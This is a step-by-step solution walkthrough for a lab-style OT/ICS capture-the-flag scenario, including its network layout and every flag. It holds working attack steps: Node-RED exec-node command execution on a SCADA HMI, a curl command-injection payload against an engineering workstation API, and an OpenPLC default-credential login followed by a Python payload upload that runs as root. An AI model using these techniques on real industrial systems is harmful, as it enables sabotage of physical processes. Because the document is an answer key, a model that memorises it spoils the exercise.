# Complex OT Sandbox — Training Solution Walkthrough

This document provides the complete step-by-step solutions for all training levels of the **Complex OT Sabotage Sandbox** training scenario. This variant removes shared SSH keys and implements a multi-hop pivoting path using a dedicated **Engineering Workstation (EWS)**.

---

## Network Layout

| Host | Subnet | IP | Services |
|---|---|---|---|
| `attacker-host` | mgmt-net | `10.10.10.50` | Kali Linux (attacker workstation) |
| `scada-hmi` | operations-net | `192.168.100.10` | Node-RED on port `1880` |
| `engineering-station` | control-net | `192.168.200.20` | Vulnerable API on port `5000` |
| `openplc-node` | control-net | `192.168.200.10` | OpenPLC on port `8080` (Web) & `502` (Modbus) |
| `ot-router` | mgmt-net / operations-net / control-net | `10.10.10.1` / `192.168.100.1` / `192.168.200.1` | Gateway firewall |

### Firewall Rules (configured on `ot-router`)

*   Attacker (`10.10.10.50`) is blocked from reaching EWS (`192.168.200.20`) and PLC (`192.168.200.10`) directly.
*   SCADA HMI (`192.168.100.10`) is blocked from reaching PLC on ports `8080` (Web Admin) and `22` (SSH). It is only allowed to reach port `502` (Modbus).
*   SCADA HMI is allowed to reach EWS on port `5000` (Management API).
*   EWS is allowed to reach the PLC on port `8080` (Web Admin).

---

## Level 0: Welcome

Read the introduction. No action required — click **Next**.

---

## Level 1: Access the Attacker Host

1.  Select **`attacker-host`** on the topology graph.
2.  Click the **Web Console** link.
3.  Submit the passkey: **`start`**

---

## Level 2: SCADA HMI Compromise

**Objective:** Exploit the unauthenticated Node-RED flow builder on `scada-hmi` (`192.168.100.10:1880`) to read `/root/flag.txt`.

**Answer:** `FLAG{SCADA_HMI_COMPROMISED}`

### Steps:
1.  Open the Kali web browser and go to `http://192.168.100.10:1880/`.
2.  Drag an **`inject`** node, an **`exec`** node, and a **`debug`** node onto the canvas.
3.  Configure the `exec` node with the command: `cat /root/flag.txt`.
4.  Wire them together: `inject` ──► `exec` ──► `debug`.
5.  Click **Deploy** and click the trigger button on the `inject` node.
6.  Copy the flag from the debug panel: `FLAG{SCADA_HMI_COMPROMISED}`.

---

## Level 3: Engineering Station Pivot

**Objective:** Pivot through the HMI shell to exploit a command execution vulnerability on the Engineering Workstation (EWS) (`192.168.200.20:5000`) and read `/home/engineer/flag2.txt`.

**Answer:** `FLAG{EWS_PIVOT_SUCCESS}`

### Steps:
1.  Add a new `exec` node to your Node-RED canvas.
2.  Configure it with the following `curl` command to send a POST request containing a command injection payload to the EWS API:
    ```bash
    curl -X POST -H "Content-Type: application/json" -d '{"cmd": "cat /home/engineer/flag2.txt"}' http://192.168.200.20:5000/
    ```
3.  Wire an `inject` node and a `debug` node to it, deploy, and trigger.
4.  The output in the debug panel will show the JSON response:
    ```json
    {
      "status": "success",
      "output": "FLAG{EWS_PIVOT_SUCCESS}\n"
    }
    ```

---

## Level 4: PLC Logic Compromise (No SSH)

**Objective:** Access the PLC's OpenPLC Web Admin Panel (`192.168.200.10:8080`) from the EWS, log in using default credentials, and upload a Python payload to read `/root/flag3.txt` without utilizing operating system SSH keys.

**Answer:** `FLAG{PLC_LOGIC_COMPROMISED}`

### Steps:

#### Step 1 — Authenticate to the OpenPLC Web Server
From your compromised EWS shell (via Node-RED exec node linking to EWS command execution), run the following `curl` command to authenticate and save session cookies:
```bash
curl -s -c /tmp/cookies.txt -d "username=openplc&password=openplc" http://192.168.200.10:8080/login
```

#### Step 2 — Upload the Custom Python payload (PSM)
Submit a POST request to change the hardware driver layer to a custom Python module containing a file-copy script. This copies `/root/flag3.txt` into OpenPLC's public web directory:

```bash
curl -s -b /tmp/cookies.txt -d "hardware_layer=custom&custom_layer_code=import+os%0Aos.system%28%27cat+/root/flag3.txt+%3E+/opt/OpenPLC_v3/webserver/st_files/flag.txt%27%29" http://192.168.200.10:8080/hardware
```

#### Step 3 — Download the Flag
Once compiled and started in run mode, OpenPLC executes the Python submodule script as `root`. You can download the flag directly without authentication using:

```bash
curl -s http://192.168.200.10:8080/st_files/flag.txt
```

Expected output:
```
FLAG{PLC_LOGIC_COMPROMISED}
```
